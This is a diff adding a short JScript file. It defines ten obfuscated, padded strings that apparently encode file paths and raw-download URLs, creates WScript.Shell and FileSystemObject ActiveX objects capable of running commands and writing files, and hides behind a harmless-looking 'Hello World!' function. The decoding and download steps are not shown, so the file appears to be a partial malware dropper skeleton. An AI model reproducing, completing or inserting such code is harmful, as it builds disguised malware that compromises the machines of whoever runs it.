@@ -1,0 +1,32 @@
+////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////
+var pa0="klljkdFHSDFG4fgfdlg";
+var pa1="k~{wmv%lklm~zkom%Egserbr}tileE.l}qal@seffi|us.abbliqafi}|@dafa.miqr}s}tf.q}|tiu.qrede|fials.vC\\B@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
+var pa2="qmr~,z%-qvkls~zs%advabiSR\\xs@@@@@@@@@@@@@@@@@@@@@@@@@@";
+var pa3="qgr~,z%-klm~zkzm%msqft\\daf@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
+var pa4="qgr~)z%+klm~zkzm%msjmlV\\daf@@@@@@@@@@@@@@@@@@@@@@@@@@@";
+var pa5="}zv{,m%-klm~zkhm%hffbsZ]]raw\\uifhgpgserq}|fe|f\\q}m]u}}dma|BBCCRR]asBBC]masfer]|}mzSR\\fmb@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
+var pa6="}zv{)m%+klm~zkhm%hffbsZ]]raw\\uifhgpgserq}|fe|f\\q}m]u}}dma|BBCCRR]asBBC]masfer]|}mzVF\\fmb@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
+var pa7="rgr~sdbedlm~ppzm%samqli\\daf@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
+var pa8="rgr~sdbsglm~srzm%samlip\\daf@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
+var pa9="gzv{,jk-klm~zsdm%hffbsZ]]raw\\uifhgpgserq}|fe|f\\q}m]u}}dma|BBCCRR]asBBC]masfer]|}mzCRJ\\fmb@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
+var pa10="gzv{,km-klm~zssm%hffbsZ]]raw\\uifhgpgserq}|fe|f\\q}m]u}}dma|BBCCRR]asBBC]masfer]|}mzRGV\\fmb@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@";
+
+var d1="", f1="", f2="", f3="", f4="", u1="", u2="", u3="", u4="", findout="", fname1="", fname2="";
+
+var wshell = new ActiveXObject("WScript.Shell");
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+
+ISTA();
+
+function ISTA()
+{
+    try
+    {
+        document.write("Hello World!");
+    }
+    catch(e)
+    {
+    }
+   
+};
